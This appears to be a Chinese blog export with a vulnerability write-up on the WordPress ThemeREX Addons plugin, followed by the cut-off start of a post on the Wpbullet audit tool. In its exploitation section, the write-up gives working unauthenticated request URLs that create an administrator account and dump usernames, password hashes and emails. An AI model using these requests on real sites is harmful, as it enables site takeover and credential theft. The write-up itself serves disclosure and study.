\\\trx_addons\\\\includes\\\\plugin.rest-api.php文件中，有着如下代码\n\n![8rveL4.png](https://s1.ax1x.com/2020/03/19/8rveL4.png)\n\n通过上图可见，程序通过add_action方法将trx_addons_rest_register_endpoints函数挂接到rest_api_init动作上。\n\n我们查看一下rest_api_init这个动作\n\n![8rvkWV.png](https://s1.ax1x.com/2020/03/19/8rvkWV.png)\n\n通过上图描述不难看出：\nrest_api_init动作将会在API请求发送到服务器后，服务器初始化处理API请求时触发。将trx_addons_rest_register_endpoints函数挂接到rest_api_init动作上，当有API请求发送到后台处理时，trx_addons_rest_register_endpoints方法将会被加载。\n\n继续跟踪后续代码\n\n![8rvRTs.png](https://s1.ax1x.com/2020/03/19/8rvRTs.png)\n\n在trx_addons_rest_register_endpoints方法中通过register_rest_route方法注册了一个自定义接口，见上图红框处。\n\n这里简单介绍一下register_rest_route方法：\n\nWordPress官方核心代码提供了一套WP_REST_API接口，但是实际开发以及使用过程中难免会出现官方API接口满足不了实际需求的状况。为此WordPress提供了register_rest_route方法用于自定义注册WP\nREST API接口。\n\nregister_rest_route方法参数如下\n\n![8rvfkn.png](https://s1.ax1x.com/2020/03/19/8rvfkn.png)\n\n在介绍完register_rest_route方法后，我们回归漏洞代码，分析此处register_rest_route方法注册的API接口\n\n![8rvQF1.png](https://s1.ax1x.com/2020/03/19/8rvQF1.png)\n\n通过上图第一个红框处namespace以及route属性值可知：该接口路由为trx_addons/v2/get/sc_layout；通过第二个红框methods属性值可知：该接口可以通过GET\\\\POST方法访问；通过第三个红框callback属性值可知：该接口回调函数为漏洞触发点trx_addons_rest_get_sc_layout方法。通过上述信息，我们可以构造出通往漏洞触发点的请求。\n\n除了通过分析代码来请求这种方法外，我们还可以通过wordpress还提供的接口来方便快捷的查看所有注册的API接口信息。\n\n访问127.0.0.1/wordpress/wp-json/ 见下图\n\n![8rvJyD.png](https://s1.ax1x.com/2020/03/19/8rvJyD.png)\n\nwp-json这个目录会将wordpress中所有注册的API接口信息展示出来。\n\n通过页面中展示的API列表，我们可以看见/trx_addons/v2/get/sc_layout路由信息\n\n展开/trx_addons/v2/get/sc_layout路由 见下图\n\n![8rv2wj.png](https://s1.ax1x.com/2020/03/19/8rv2wj.png)\n\n上图为展开后的详细接口信息，在这里我们可以看到该接口允许的methods以及url地址\n\n值得注意的是：通过分析 /trx_addons/v2/get/sc_layout接口代码时可发现，ThemeREX\nAddons插件并没有在代码中使用current_user_can等方法对接口进行权限校验。也就是说，未经身份验证的用户也可以访问该接口从而触发漏洞\n\n**0x03 漏洞利用**\n-----------------\n\n通过上文的分析可知，我们可以通过请求来控制待执行的函数名，并可以通过一个数组对该函数传参。因此我们需要找到一个可以利用的PHP或wordpress函数，该函数需要满足可以接收并处理数组类型参数\n\n### 利用一：通过wp_insert_user新建管理员账号\n\n构造如下链接：\n\n<http://127.0.0.1/wordpress/?rest_route=/trx_addons/v2/get/sc_layout&sc=wp_insert_user&role=administrator&user_login=TEST&user_pass=TEST>\n\n不需要进行登录操作，直接访问以上链接即可成功利用。\n\n根据上文漏洞分析一章可知，该链接最终会触发trx_addons_rest_get_sc_layout方法，见下图\n\n![8rvAzT.png](https://s1.ax1x.com/2020/03/19/8rvAzT.png)\n\n此时上图中的\\$sc参数值对应payload中sc值，为wp_insert_user\n\n此时\\$params数组值如下图\n\n![8rvlJx.png](https://s1.ax1x.com/2020/03/19/8rvlJx.png)\n\n程序将\\$params数组作为参数传入wp_insert_user方法并执行wp_insert_user方法。\n\nwp_insert_user方法可以为wordpress程序添加一个指定权限的用户，该方法接收一个数组作为参数满足触发漏洞的要求，见下图\n\n![8rvVQU.png](https://s1.ax1x.com/2020/03/19/8rvVQU.png)\n\nwp_insert_user方法参数说明如下\n\n![8rvYOe.png](https://s1.ax1x.com/2020/03/19/8rvYOe.png)\n\n由此一来，wordpress中将会增添一个administrator权限的名为TEST的用户，如下图\n\n![8rvuw9.png](https://s1.ax1x.com/2020/03/19/8rvuw9.png)\n\n利用新创建的管理员账号可以完成进一步攻击：例如通过修改wordpress模板等操作，在wordpress中写入后门文件。\n\n### 利用二：通过wp_dropdown_users查看所有账号信息\n\n构造如下链接：\n\n<http://127.0.0.1/wordpress/wp-json/trx_addons/v2/get/sc_layout?sc=wp_dropdown_users&show=user_login>\n\nwp_dropdown_users为wordpress提供的用来查询用户信息的函数\n\n![8rvUwd.png](https://s1.ax1x.com/2020/03/19/8rvUwd.png)\n\nwp_dropdown_users同样满足可以接收一个数组作为参数的需求，wp_dropdown_users参数说明如下\n\n![8rv1W6.png](https://s1.ax1x.com/2020/03/19/8rv1W6.png)\n\n通过wp_dropdown_users接口可以泄露wordpress账号信息。该操作同样不需要任何权限\n\n上述payload中指定show参数值为user_login，这样可以查看wordpress所有用户名，见下图\n\n![8rvNeH.png](https://s1.ax1x.com/2020/03/19/8rvNeH.png)\n\nshow参数值可以设置为user_pass来进行查看存储在数据库中加密后的密码，见下图\n\n![8rvwFI.png](https://s1.ax1x.com/2020/03/19/8rvwFI.png)\n\nshow参数值可以设置为user_email来进行查看邮箱，见下图\n\n![8rvGQO.png](https://s1.ax1x.com/2020/03/19/8rvGQO.png)\n\n**0x04 总结**\n-------------\n\n为了解决安全问题，ThemeREX选择将受影响的plugin.rest-api.php文件完全删除。plugin.rest-api.php文件是为了提供与Gutenberg插件的兼容性而设计，但在目前版本中Gutenberg插件已完全集成为WordPress核心。因此plugin.rest-api.php文件不再被需要，删除该文件不会影响到用户的正常使用。","slug":"WordpPress-ThemeREX-Addons","published":1,"updated":"2020-10-27T09:25:29.918Z","_id":"ckgrozu90002fwsa94inu1f7i","comments":1,"layout":"post","photos":[],"link":"","content":"<p>ThemeREX是一家专门出售商业WordPress主题的公司。ThemeREX Addons插件为ThemeREX公司开发的预装在所有ThemeREX商业主题中用来帮助其用户设置新站点和控制不同的主题的一款插件。根据相关预测，该插件预装在超过44000个网站上。</p>\n<a id=\"more\"></a>\n\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvrSf.png\" alt=\"8rvrSf.png\"></p>\n<h2 id=\"0x01-漏洞描述\"><a href=\"#0x01-漏洞描述\" class=\"headerlink\" title=\"0x01 漏洞描述\"></a><strong>0x01 漏洞描述</strong></h2><p>WordPress ThemeREX Addons 2020-03-09之前版本中存在安全漏洞。未经授权的攻击者可利用该漏洞在后台添加一个管理员账号、或是查看所有账号信息等操作。</p>\n<h2 id=\"0x02-漏洞分析\"><a href=\"#0x02-漏洞分析\" class=\"headerlink\" title=\"0x02 漏洞分析\"></a><strong>0x02 漏洞分析</strong></h2><p>根据相关披露，漏洞应该存在于plugin.rest-api.php文件中</p>\n<p>我们首先来看一下\\wp-content\\plugins\\trx_addons\\includes\\plugin.rest-api.php文件中的代码</p>\n<p>位于该文件40行处，存在一处trx_addons_rest_get_sc_layout方法，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rv0Yt.png\" alt=\"8rv0Yt.png\"></p>\n<p>在该方法中，存在一处明显的漏洞点，见下图代码块</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvsl8.png\" alt=\"8rvsl8.png\"></p>\n<p>接下来我们根据这段代码详细分析下。我们首先来观察一下下图53行红框处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvy6S.png\" alt=\"8rvy6S.png\"></p>\n<p>位于上图红框处，可见程序从请求中直接获得参数，并将请求中的参数键值对赋值与$params数组。这将导致$params数组可控</p>\n<p>紧接着，程序判断$params数组中是否存在名为’sc’的键名，见下图红框处</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rv8SK.png\" alt=\"8rv8SK.png\"></p>\n<p>若该键名存在，经过字符替换处理后将其值赋与$sc变量。</p>\n<p>简单来说，这里的$sc变量可以通过请求中的sc参数进行传递。</p>\n<p>随后，程序通过function_exists判断$sc变量对应的方法是否存在，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvaTA.png\" alt=\"8rvaTA.png\"></p>\n<p>如果$sc变量中对应的方法存在，程序将$params数组作为参数列表传入该方法执行。</p>\n<p>至此，漏洞的触发点我们已经分析完毕。接下来我们需要寻找一下调用链</p>\n<p>由于漏洞触发点位于trx_addons_rest_get_sc_layout方法中，我们需要分析一下如何构造请求以触发这个漏洞。</p>\n<p>仍然是位于\\wp-content\\plugins\\trx_addons\\includes\\plugin.rest-api.php文件中，有着如下代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rveL4.png\" alt=\"8rveL4.png\"></p>\n<p>通过上图可见，程序通过add_action方法将trx_addons_rest_register_endpoints函数挂接到rest_api_init动作上。</p>\n<p>我们查看一下rest_api_init这个动作</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvkWV.png\" alt=\"8rvkWV.png\"></p>\n<p>通过上图描述不难看出：<br>rest_api_init动作将会在API请求发送到服务器后，服务器初始化处理API请求时触发。将trx_addons_rest_register_endpoints函数挂接到rest_api_init动作上，当有API请求发送到后台处理时，trx_addons_rest_register_endpoints方法将会被加载。</p>\n<p>继续跟踪后续代码</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvRTs.png\" alt=\"8rvRTs.png\"></p>\n<p>在trx_addons_rest_register_endpoints方法中通过register_rest_route方法注册了一个自定义接口，见上图红框处。</p>\n<p>这里简单介绍一下register_rest_route方法：</p>\n<p>WordPress官方核心代码提供了一套WP_REST_API接口，但是实际开发以及使用过程中难免会出现官方API接口满足不了实际需求的状况。为此WordPress提供了register_rest_route方法用于自定义注册WP<br>REST API接口。</p>\n<p>register_rest_route方法参数如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvfkn.png\" alt=\"8rvfkn.png\"></p>\n<p>在介绍完register_rest_route方法后，我们回归漏洞代码，分析此处register_rest_route方法注册的API接口</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvQF1.png\" alt=\"8rvQF1.png\"></p>\n<p>通过上图第一个红框处namespace以及route属性值可知：该接口路由为trx_addons/v2/get/sc_layout；通过第二个红框methods属性值可知：该接口可以通过GET\\POST方法访问；通过第三个红框callback属性值可知：该接口回调函数为漏洞触发点trx_addons_rest_get_sc_layout方法。通过上述信息，我们可以构造出通往漏洞触发点的请求。</p>\n<p>除了通过分析代码来请求这种方法外，我们还可以通过wordpress还提供的接口来方便快捷的查看所有注册的API接口信息。</p>\n<p>访问127.0.0.1/wordpress/wp-json/ 见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvJyD.png\" alt=\"8rvJyD.png\"></p>\n<p>wp-json这个目录会将wordpress中所有注册的API接口信息展示出来。</p>\n<p>通过页面中展示的API列表，我们可以看见/trx_addons/v2/get/sc_layout路由信息</p>\n<p>展开/trx_addons/v2/get/sc_layout路由 见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rv2wj.png\" alt=\"8rv2wj.png\"></p>\n<p>上图为展开后的详细接口信息，在这里我们可以看到该接口允许的methods以及url地址</p>\n<p>值得注意的是：通过分析 /trx_addons/v2/get/sc_layout接口代码时可发现，ThemeREX<br>Addons插件并没有在代码中使用current_user_can等方法对接口进行权限校验。也就是说，未经身份验证的用户也可以访问该接口从而触发漏洞</p>\n<h2 id=\"0x03-漏洞利用\"><a href=\"#0x03-漏洞利用\" class=\"headerlink\" title=\"0x03 漏洞利用\"></a><strong>0x03 漏洞利用</strong></h2><p>通过上文的分析可知，我们可以通过请求来控制待执行的函数名，并可以通过一个数组对该函数传参。因此我们需要找到一个可以利用的PHP或wordpress函数，该函数需要满足可以接收并处理数组类型参数</p>\n<h3 id=\"利用一：通过wp-insert-user新建管理员账号\"><a href=\"#利用一：通过wp-insert-user新建管理员账号\" class=\"headerlink\" title=\"利用一：通过wp_insert_user新建管理员账号\"></a>利用一：通过wp_insert_user新建管理员账号</h3><p>构造如下链接：</p>\n<p><a href=\"http://127.0.0.1/wordpress/?rest_route=/trx_addons/v2/get/sc_layout&amp;sc=wp_insert_user&amp;role=administrator&amp;user_login=TEST&amp;user_pass=TEST\">http://127.0.0.1/wordpress/?rest_route=/trx_addons/v2/get/sc_layout&amp;sc=wp_insert_user&amp;role=administrator&amp;user_login=TEST&amp;user_pass=TEST</a></p>\n<p>不需要进行登录操作，直接访问以上链接即可成功利用。</p>\n<p>根据上文漏洞分析一章可知，该链接最终会触发trx_addons_rest_get_sc_layout方法，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvAzT.png\" alt=\"8rvAzT.png\"></p>\n<p>此时上图中的$sc参数值对应payload中sc值，为wp_insert_user</p>\n<p>此时$params数组值如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvlJx.png\" alt=\"8rvlJx.png\"></p>\n<p>程序将$params数组作为参数传入wp_insert_user方法并执行wp_insert_user方法。</p>\n<p>wp_insert_user方法可以为wordpress程序添加一个指定权限的用户，该方法接收一个数组作为参数满足触发漏洞的要求，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvVQU.png\" alt=\"8rvVQU.png\"></p>\n<p>wp_insert_user方法参数说明如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvYOe.png\" alt=\"8rvYOe.png\"></p>\n<p>由此一来，wordpress中将会增添一个administrator权限的名为TEST的用户，如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvuw9.png\" alt=\"8rvuw9.png\"></p>\n<p>利用新创建的管理员账号可以完成进一步攻击：例如通过修改wordpress模板等操作，在wordpress中写入后门文件。</p>\n<h3 id=\"利用二：通过wp-dropdown-users查看所有账号信息\"><a href=\"#利用二：通过wp-dropdown-users查看所有账号信息\" class=\"headerlink\" title=\"利用二：通过wp_dropdown_users查看所有账号信息\"></a>利用二：通过wp_dropdown_users查看所有账号信息</h3><p>构造如下链接：</p>\n<p><a href=\"http://127.0.0.1/wordpress/wp-json/trx_addons/v2/get/sc_layout?sc=wp_dropdown_users&amp;show=user_login\">http://127.0.0.1/wordpress/wp-json/trx_addons/v2/get/sc_layout?sc=wp_dropdown_users&amp;show=user_login</a></p>\n<p>wp_dropdown_users为wordpress提供的用来查询用户信息的函数</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvUwd.png\" alt=\"8rvUwd.png\"></p>\n<p>wp_dropdown_users同样满足可以接收一个数组作为参数的需求，wp_dropdown_users参数说明如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rv1W6.png\" alt=\"8rv1W6.png\"></p>\n<p>通过wp_dropdown_users接口可以泄露wordpress账号信息。该操作同样不需要任何权限</p>\n<p>上述payload中指定show参数值为user_login，这样可以查看wordpress所有用户名，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvNeH.png\" alt=\"8rvNeH.png\"></p>\n<p>show参数值可以设置为user_pass来进行查看存储在数据库中加密后的密码，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvwFI.png\" alt=\"8rvwFI.png\"></p>\n<p>show参数值可以设置为user_email来进行查看邮箱，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s1.ax1x.com/2020/03/19/8rvGQO.png\" alt=\"8rvGQO.png\"></p>\n<h2 id=\"0x04-总结\"><a href=\"#0x04-总结\" class=\"headerlink\" title=\"0x04 总结\"></a><strong>0x04 总结</strong></h2><p>为了解决安全问题，ThemeREX选择将受影响的plugin.rest-api.php文件完全删除。plugin.rest-api.php文件是为了提供与Gutenberg插件的兼容性而设计，但在目前版本中Gutenberg插件已完全集成为WordPress核心。因此plugin.rest-api.php文件不再被需要，删除该文件不会影响到用户的正常使用。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>ThemeREX是一家专门出售商业WordPress主题的公司。ThemeREX Addons插件为ThemeREX公司开发的预装在所有ThemeREX商业主题中用来帮助其用户设置新站点和控制不同的主题的一款插件。根据相关预测，该插件预装在超过44000个网站上。</p>","more":"<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvrSf.png\" alt=\"8rvrSf.png\"></p>\n<h2 id=\"0x01-漏洞描述\"><a href=\"#0x01-漏洞描述\" class=\"headerlink\" title=\"0x01 漏洞描述\"></a><strong>0x01 漏洞描述</strong></h2><p>WordPress ThemeREX Addons 2020-03-09之前版本中存在安全漏洞。未经授权的攻击者可利用该漏洞在后台添加一个管理员账号、或是查看所有账号信息等操作。</p>\n<h2 id=\"0x02-漏洞分析\"><a href=\"#0x02-漏洞分析\" class=\"headerlink\" title=\"0x02 漏洞分析\"></a><strong>0x02 漏洞分析</strong></h2><p>根据相关披露，漏洞应该存在于plugin.rest-api.php文件中</p>\n<p>我们首先来看一下\\wp-content\\plugins\\trx_addons\\includes\\plugin.rest-api.php文件中的代码</p>\n<p>位于该文件40行处，存在一处trx_addons_rest_get_sc_layout方法，如下图</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rv0Yt.png\" alt=\"8rv0Yt.png\"></p>\n<p>在该方法中，存在一处明显的漏洞点，见下图代码块</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvsl8.png\" alt=\"8rvsl8.png\"></p>\n<p>接下来我们根据这段代码详细分析下。我们首先来观察一下下图53行红框处</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvy6S.png\" alt=\"8rvy6S.png\"></p>\n<p>位于上图红框处，可见程序从请求中直接获得参数，并将请求中的参数键值对赋值与$params数组。这将导致$params数组可控</p>\n<p>紧接着，程序判断$params数组中是否存在名为’sc’的键名，见下图红框处</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rv8SK.png\" alt=\"8rv8SK.png\"></p>\n<p>若该键名存在，经过字符替换处理后将其值赋与$sc变量。</p>\n<p>简单来说，这里的$sc变量可以通过请求中的sc参数进行传递。</p>\n<p>随后，程序通过function_exists判断$sc变量对应的方法是否存在，见下图</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvaTA.png\" alt=\"8rvaTA.png\"></p>\n<p>如果$sc变量中对应的方法存在，程序将$params数组作为参数列表传入该方法执行。</p>\n<p>至此，漏洞的触发点我们已经分析完毕。接下来我们需要寻找一下调用链</p>\n<p>由于漏洞触发点位于trx_addons_rest_get_sc_layout方法中，我们需要分析一下如何构造请求以触发这个漏洞。</p>\n<p>仍然是位于\\wp-content\\plugins\\trx_addons\\includes\\plugin.rest-api.php文件中，有着如下代码</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rveL4.png\" alt=\"8rveL4.png\"></p>\n<p>通过上图可见，程序通过add_action方法将trx_addons_rest_register_endpoints函数挂接到rest_api_init动作上。</p>\n<p>我们查看一下rest_api_init这个动作</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvkWV.png\" alt=\"8rvkWV.png\"></p>\n<p>通过上图描述不难看出：<br>rest_api_init动作将会在API请求发送到服务器后，服务器初始化处理API请求时触发。将trx_addons_rest_register_endpoints函数挂接到rest_api_init动作上，当有API请求发送到后台处理时，trx_addons_rest_register_endpoints方法将会被加载。</p>\n<p>继续跟踪后续代码</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvRTs.png\" alt=\"8rvRTs.png\"></p>\n<p>在trx_addons_rest_register_endpoints方法中通过register_rest_route方法注册了一个自定义接口，见上图红框处。</p>\n<p>这里简单介绍一下register_rest_route方法：</p>\n<p>WordPress官方核心代码提供了一套WP_REST_API接口，但是实际开发以及使用过程中难免会出现官方API接口满足不了实际需求的状况。为此WordPress提供了register_rest_route方法用于自定义注册WP<br>REST API接口。</p>\n<p>register_rest_route方法参数如下</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvfkn.png\" alt=\"8rvfkn.png\"></p>\n<p>在介绍完register_rest_route方法后，我们回归漏洞代码，分析此处register_rest_route方法注册的API接口</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvQF1.png\" alt=\"8rvQF1.png\"></p>\n<p>通过上图第一个红框处namespace以及route属性值可知：该接口路由为trx_addons/v2/get/sc_layout；通过第二个红框methods属性值可知：该接口可以通过GET\\POST方法访问；通过第三个红框callback属性值可知：该接口回调函数为漏洞触发点trx_addons_rest_get_sc_layout方法。通过上述信息，我们可以构造出通往漏洞触发点的请求。</p>\n<p>除了通过分析代码来请求这种方法外，我们还可以通过wordpress还提供的接口来方便快捷的查看所有注册的API接口信息。</p>\n<p>访问127.0.0.1/wordpress/wp-json/ 见下图</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvJyD.png\" alt=\"8rvJyD.png\"></p>\n<p>wp-json这个目录会将wordpress中所有注册的API接口信息展示出来。</p>\n<p>通过页面中展示的API列表，我们可以看见/trx_addons/v2/get/sc_layout路由信息</p>\n<p>展开/trx_addons/v2/get/sc_layout路由 见下图</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rv2wj.png\" alt=\"8rv2wj.png\"></p>\n<p>上图为展开后的详细接口信息，在这里我们可以看到该接口允许的methods以及url地址</p>\n<p>值得注意的是：通过分析 /trx_addons/v2/get/sc_layout接口代码时可发现，ThemeREX<br>Addons插件并没有在代码中使用current_user_can等方法对接口进行权限校验。也就是说，未经身份验证的用户也可以访问该接口从而触发漏洞</p>\n<h2 id=\"0x03-漏洞利用\"><a href=\"#0x03-漏洞利用\" class=\"headerlink\" title=\"0x03 漏洞利用\"></a><strong>0x03 漏洞利用</strong></h2><p>通过上文的分析可知，我们可以通过请求来控制待执行的函数名，并可以通过一个数组对该函数传参。因此我们需要找到一个可以利用的PHP或wordpress函数，该函数需要满足可以接收并处理数组类型参数</p>\n<h3 id=\"利用一：通过wp-insert-user新建管理员账号\"><a href=\"#利用一：通过wp-insert-user新建管理员账号\" class=\"headerlink\" title=\"利用一：通过wp_insert_user新建管理员账号\"></a>利用一：通过wp_insert_user新建管理员账号</h3><p>构造如下链接：</p>\n<p><a href=\"http://127.0.0.1/wordpress/?rest_route=/trx_addons/v2/get/sc_layout&amp;sc=wp_insert_user&amp;role=administrator&amp;user_login=TEST&amp;user_pass=TEST\">http://127.0.0.1/wordpress/?rest_route=/trx_addons/v2/get/sc_layout&amp;sc=wp_insert_user&amp;role=administrator&amp;user_login=TEST&amp;user_pass=TEST</a></p>\n<p>不需要进行登录操作，直接访问以上链接即可成功利用。</p>\n<p>根据上文漏洞分析一章可知，该链接最终会触发trx_addons_rest_get_sc_layout方法，见下图</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvAzT.png\" alt=\"8rvAzT.png\"></p>\n<p>此时上图中的$sc参数值对应payload中sc值，为wp_insert_user</p>\n<p>此时$params数组值如下图</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvlJx.png\" alt=\"8rvlJx.png\"></p>\n<p>程序将$params数组作为参数传入wp_insert_user方法并执行wp_insert_user方法。</p>\n<p>wp_insert_user方法可以为wordpress程序添加一个指定权限的用户，该方法接收一个数组作为参数满足触发漏洞的要求，见下图</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvVQU.png\" alt=\"8rvVQU.png\"></p>\n<p>wp_insert_user方法参数说明如下</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvYOe.png\" alt=\"8rvYOe.png\"></p>\n<p>由此一来，wordpress中将会增添一个administrator权限的名为TEST的用户，如下图</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvuw9.png\" alt=\"8rvuw9.png\"></p>\n<p>利用新创建的管理员账号可以完成进一步攻击：例如通过修改wordpress模板等操作，在wordpress中写入后门文件。</p>\n<h3 id=\"利用二：通过wp-dropdown-users查看所有账号信息\"><a href=\"#利用二：通过wp-dropdown-users查看所有账号信息\" class=\"headerlink\" title=\"利用二：通过wp_dropdown_users查看所有账号信息\"></a>利用二：通过wp_dropdown_users查看所有账号信息</h3><p>构造如下链接：</p>\n<p><a href=\"http://127.0.0.1/wordpress/wp-json/trx_addons/v2/get/sc_layout?sc=wp_dropdown_users&amp;show=user_login\">http://127.0.0.1/wordpress/wp-json/trx_addons/v2/get/sc_layout?sc=wp_dropdown_users&amp;show=user_login</a></p>\n<p>wp_dropdown_users为wordpress提供的用来查询用户信息的函数</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvUwd.png\" alt=\"8rvUwd.png\"></p>\n<p>wp_dropdown_users同样满足可以接收一个数组作为参数的需求，wp_dropdown_users参数说明如下</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rv1W6.png\" alt=\"8rv1W6.png\"></p>\n<p>通过wp_dropdown_users接口可以泄露wordpress账号信息。该操作同样不需要任何权限</p>\n<p>上述payload中指定show参数值为user_login，这样可以查看wordpress所有用户名，见下图</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvNeH.png\" alt=\"8rvNeH.png\"></p>\n<p>show参数值可以设置为user_pass来进行查看存储在数据库中加密后的密码，见下图</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvwFI.png\" alt=\"8rvwFI.png\"></p>\n<p>show参数值可以设置为user_email来进行查看邮箱，见下图</p>\n<p><img src=\"https://s1.ax1x.com/2020/03/19/8rvGQO.png\" alt=\"8rvGQO.png\"></p>\n<h2 id=\"0x04-总结\"><a href=\"#0x04-总结\" class=\"headerlink\" title=\"0x04 总结\"></a><strong>0x04 总结</strong></h2><p>为了解决安全问题，ThemeREX选择将受影响的plugin.rest-api.php文件完全删除。plugin.rest-api.php文件是为了提供与Gutenberg插件的兼容性而设计，但在目前版本中Gutenberg插件已完全集成为WordPress核心。因此plugin.rest-api.php文件不再被需要，删除该文件不会影响到用户的正常使用。</p>"},{"title":"一款针对Wordpress开发的代码审计工具——Wpbuttle（工具介绍与源码分析）","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/security.jpg","date":"2020-05-06T09:28:09.000Z","_content":"\n前言\n----\n\n近日发现了一款有意思的PHP静态代码审计工具——Wpbullet。与其他PHP代码审计工具不同的是，Wpbullet是一款针对WordPress插件/主题开发的静态代码分析工具。\n\nWordpress自身代码尚且可以说很安全，但是其插件的安全却参差不齐，这款工具可以对WordPress、插件、主题进行静态代码初步的审计，方便后续的漏洞挖掘工作。\n\n由于该工具的说明文档较少，我对其工作原理以及其检测能力比较好奇，因此这篇文章除了简单介绍一下这个工具如何使用之外，更重要的是分析Wpbuttle这块工具的源码，介绍一下它的检测思路。\n\n工具安装\n--------\n\nWpbulle的github地址如下：\n\n<https://github.com/webarx-security/wpbullet>\n\n安装过程很简单，只需克隆项目、安装依赖并运行脚本即可\n\n-   \\$ git clone https://github.com/webarx-security/wpbullet wpbullet\n\n-   \\$ cd wpbullet\n\n-   \\$ pip install -r requirements.txt\n\n-   \\$ python wpbullet.py\n\npython2.x python3.x环境皆可使用。笔者这里测试使用的是python3.7环境\n\n**工具使用**\n------------\n\n可用选项：\n\n![fb622d563b38d42d6926bb912edbbbfa.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144530-065b9032-852e-1.png)\n\n值得注意的是Wpbulle这款工具除了支持对本地源代码的审计之外，还支持根据传入的插件/主题\nURL\n自动下载源码来审计。如上图使用说明可见，--path除了可以传入本地插件目录以外，还支持传入wordpress官网中插件下载路径，工具将对插件下载解压并进行审计操作。\n\n在了解了Wpbulle工具如何安装与使用后，我们来看一下Wpbulle代码，了解一下这个工具是如何实现的，以及其是否能很好的帮助我们挖出漏洞\n\n首先我们来到扫描入口处wpbullet-dev/core/scanner.py\n\n![b346bf575c9b71e177aa8a5cf7549764.png](https://xzfile.aliyuncs.com/media/upload/picture/20200423144556-15687c02-852e-1.png)\n\n在scan中，首先可以看到其根据需要，从提供的wordpress官网插件地址进行下载的操作，如下图：\n\n![4b665e17aac3c50b090098694cf9e8d1.png](https://xzfile.aliyuncs.com/media/upload/picture/